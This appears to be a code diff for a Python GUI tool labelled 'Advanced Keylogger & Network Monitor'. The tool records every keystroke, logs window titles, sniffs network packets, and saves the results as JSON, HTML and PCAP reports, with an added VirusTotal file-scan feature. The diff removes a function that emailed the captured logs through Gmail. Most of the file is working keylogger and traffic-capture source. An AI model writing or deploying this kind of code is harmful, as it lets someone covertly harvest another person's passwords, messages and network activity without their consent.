@@ -1,30 +1,25 @@
 import os
 import threading
 import time
-import numpy as np
 import pygetwindow as gw
 import scapy.all as scapy
 import json
 import requests
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
 from datetime import datetime
 import tkinter as tk
-from tkinter import messagebox
+from tkinter import messagebox, filedialog
+from pynput import keyboard
 
 # Globals
 window_data = []
 keylogger_data = []
 captured_packets = []
+network_logs_text = []
 monitoring_threads = []
 monitoring_active = False
 stop_event = threading.Event()
 
-VIRUSTOTAL_API_KEY = 'Enter your API Key'
-
+VIRUSTOTAL_API_KEY = 'Replace with your valid API key'  
 
 def monitor_windows():
     while not stop_event.is_set():
@@ -35,10 +30,7 @@ def monitor_windows():
             window_data.append({"timestamp": timestamp, "window_title": title})
         time.sleep(2)
 
-
 def start_keylogger():
-    from pynput import keyboard
-
     def on_press(key):
         try:
             key_char = key.char
@@ -54,14 +46,18 @@ def start_keylogger():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-
 def monitor_network():
     def process_packet(packet):
         captured_packets.append(packet)
+        summary = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {packet.summary()}"
+        network_logs_text.append(summary)
 
     while not stop_event.is_set():
-        scapy.sniff(prn=process_packet, store=False, timeout=1)
-
+        try:
+            scapy.sniff(prn=process_packet, store=False, timeout=1)
+        except Exception as e:
+            print(f"[Network Error] {e}")
+            break
 
 def save_pcap():
     if captured_packets:
@@ -70,120 +66,102 @@ def save_pcap():
         return filename
     return None
 
-
-def send_email_with_attachment(sender, password, recipient, subject, body, attachment_path):
-    msg = MIMEMultipart()
-    msg['From'] = sender
-    msg['To'] = recipient
-    msg['Subject'] = subject
-
-    msg.attach(MIMEText(body, 'plain'))
-
-    with open(attachment_path, 'rb') as f:
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(f.read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
-        msg.attach(part)
-
-    try:
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(sender, password)
-        server.send_message(msg)
-        server.quit()
-        return True
-    except Exception as e:
-        print(f"[EMAIL ERROR] {e}")
-        return False
-
+def save_network_txt():
+    if network_logs_text:
+        filename = f"network_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        with open(filename, 'w') as f:
+            for line in network_logs_text:
+                f.write(line + '\n')
+        return filename
+    return None
 
 def scan_file_virustotal(filepath):
+    headers = {'x-apikey': VIRUSTOTAL_API_KEY}
     with open(filepath, 'rb') as f:
         files = {'file': (os.path.basename(filepath), f)}
-        headers = {'x-apikey': VIRUSTOTAL_API_KEY}
         response = requests.post('https://www.virustotal.com/api/v3/files', files=files, headers=headers)
-        if response.status_code == 200:
-            analysis_id = response.json()['data']['id']
-            return f"https://www.virustotal.com/gui/file-analysis/{analysis_id}"
-        return "Upload failed"
 
+    if response.status_code == 200:
+        analysis_id = response.json()['data']['id']
+        report_url = f"https://www.virustotal.com/api/v3/analyses/{analysis_id}"
+        for _ in range(10):
+            analysis_response = requests.get(report_url, headers=headers)
+            if analysis_response.status_code == 200:
+                analysis_data = analysis_response.json()
+                status = analysis_data["data"]["attributes"]["status"]
+                if status == "completed":
+                    final_link = f"https://www.virustotal.com/gui/file/{analysis_data['meta']['file_info']['sha256']}/detection"
+                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                    with open(f"virustotalresultlink_{timestamp}.txt", "w") as vrf:
+                        vrf.write(final_link)
+                    return final_link
+            time.sleep(3)
+            time.sleep(3)
+        return "Analysis still in progress. Try later."
+    else:
+        return f"Upload failed: {response.status_code}"
 
-def save_logs_and_generate_web(pcap_file):
+def save_logs_and_generate_html(pcap_file):
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    json_filename = f"logs_{timestamp}.json"
-    html_filename = f"logs_view_{timestamp}.html"
+    json_file = f"logs_{timestamp}.json"
+    html_file = f"logs_report_{timestamp}.html"
 
-    all_logs = {
-        "window_data": window_data,
-        "keylogger_data": keylogger_data,
+    data = {
+        "windows": window_data,
+        "keys": keylogger_data,
         "pcap_file": pcap_file
     }
-    with open(json_filename, 'w', encoding='utf-8') as jf:
-        json.dump(all_logs, jf, indent=2)
+
+    with open(json_file, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=2)
 
     html_content = f"""
 <!DOCTYPE html>
-<html lang="en">
+<html lang=\"en\">
 <head>
-<meta charset="UTF-8" />
-<title>Log Monitoring Dashboard</title>
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-<style>
-    body {{ background-color: #0f0f0f; color: #39ff14; font-family: monospace; }}
-    table {{ color: white; }}
-    .container {{ margin-top: 20px; }}
-</style>
+    <meta charset=\"UTF-8\">
+    <title>Log Report</title>
+    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css\" rel=\"stylesheet\">
+    <style>
+        body {{ background-color: #0f0f0f; color: #39ff14; font-family: monospace; }}
+        table {{ color: white; }}
+        .container {{ margin-top: 20px; }}
+    </style>
 </head>
 <body>
-<div class="container">
-    <h1 class="text-success">🔍 Monitoring Dashboard</h1>
+<div class=\"container\">
+    <h1 class=\"text-success\">📋 Monitoring Report</h1>
     <hr/>
-    <h3>📁 PCAP Download</h3>
-    {f'<a href="{pcap_file}" class="btn btn-outline-success">Download PCAP</a>' if pcap_file else '<p>No PCAP file captured.</p>'}
-    
+    <h3>📁 PCAP File</h3>
+    <p>{pcap_file if pcap_file else 'No network packets captured.'}</p>
+
     <h3>🪟 Window Activity</h3>
-    <table class="table table-dark table-striped"><thead><tr><th>Timestamp</th><th>Title</th></tr></thead><tbody>
-    {''.join(f'<tr><td>{log['timestamp']}</td><td>{log['window_title']}</td></tr>' for log in window_data)}
+    <table class=\"table table-dark table-striped\"><thead><tr><th>Time</th><th>Window Title</th></tr></thead><tbody>
+    {''.join(f'<tr><td>{entry['timestamp']}</td><td>{entry['window_title']}</td></tr>' for entry in window_data)}
     </tbody></table>
 
-    <h3>⌨️ Keylogs</h3>
-    <table class="table table-dark table-striped"><thead><tr><th>Timestamp</th><th>Key</th></tr></thead><tbody>
-    {''.join(f'<tr><td>{log['timestamp']}</td><td>{log['key']}</td></tr>' for log in keylogger_data)}
+    <h3>⌨️ Key Logs</h3>
+    <table class=\"table table-dark table-striped\"><thead><tr><th>Time</th><th>Key</th></tr></thead><tbody>
+    {''.join(f'<tr><td>{entry['timestamp']}</td><td>{entry['key']}</td></tr>' for entry in keylogger_data)}
     </tbody></table>
-
-    <h3>🧪 VirusTotal Scanner</h3>
-    <form action="" method="post" enctype="multipart/form-data">
-        <input type="file" name="file" class="form-control" required>
-        <button type="submit" class="btn btn-outline-warning mt-2">Scan with VirusTotal</button>
-    </form>
-
-    <h3 class="mt-4">📤 Send Report via Email</h3>
-    <form method="post">
-        <input type="email" name="sender" placeholder="Your Email" class="form-control mb-2" required>
-        <input type="password" name="password" placeholder="Email Password" class="form-control mb-2" required>
-        <input type="email" name="receiver" placeholder="Recipient Email" class="form-control mb-2" required>
-        <button class="btn btn-outline-primary">Send Logs</button>
-    </form>
 </div>
 </body>
 </html>
-    """
+"""
+    with open(html_file, 'w', encoding='utf-8') as f:
+        f.write(html_content)
 
-    with open(html_filename, 'w', encoding='utf-8') as hf:
-        hf.write(html_content)
-
-    return json_filename, html_filename
-
+    return json_file, html_file
 
 def create_gui():
     def start_detection():
-        global monitoring_active, stop_event, window_data, keylogger_data, captured_packets
+        global monitoring_active, stop_event, window_data, keylogger_data, captured_packets, network_logs_text
 
         if not monitoring_active:
-            window_data = []
-            keylogger_data = []
-            captured_packets = []
+            window_data.clear()
+            keylogger_data.clear()
+            captured_packets.clear()
+            network_logs_text.clear()
             stop_event.clear()
             monitoring_active = True
 
@@ -209,24 +187,29 @@ def create_gui():
                 thread.join(timeout=3)
 
             pcap_file = save_pcap()
-            json_file, html_file = save_logs_and_generate_web(pcap_file)
+            txt_file = save_network_txt()
+            json_file, html_file = save_logs_and_generate_html(pcap_file)
 
-            messagebox.showinfo("Monitoring Stopped", 
-                f"Logs saved:\nJSON logs: {json_file}\nHTML report: {html_file}\n" +
-                (f"PCAP file: {pcap_file}" if pcap_file else "No PCAP captured."))
+            messagebox.showinfo("Monitoring Stopped", f"Logs saved:\nJSON: {json_file}\nHTML: {html_file}\nPCAP: {pcap_file if pcap_file else 'None'}\nNetLog: {txt_file if txt_file else 'None'}")
         else:
-            messagebox.showwarning("Warning", "No monitoring active")
+            messagebox.showwarning("Warning", "Monitoring is not active")
+
+    def scan_file():
+        file_path = filedialog.askopenfilename(title="Select a file to scan")
+        if file_path:
+            result = scan_file_virustotal(file_path)
+            messagebox.showinfo("VirusTotal Scan Result", result)
 
     root = tk.Tk()
     root.title("Advanced Monitor")
-    root.geometry("400x300")
+    root.geometry("400x350")
 
     tk.Label(root, text="Advanced Keylogger & Network Monitor", font=("Arial", 14)).pack(pady=10)
     tk.Button(root, text="Start Monitoring", width=30, command=start_detection).pack(pady=5)
     tk.Button(root, text="Stop Monitoring & Save Logs", width=30, command=stop_detection).pack(pady=5)
+    tk.Button(root, text="Scan File with VirusTotal", width=30, command=scan_file).pack(pady=5)
 
     root.mainloop()
-
 
 if __name__ == "__main__":
     create_gui()
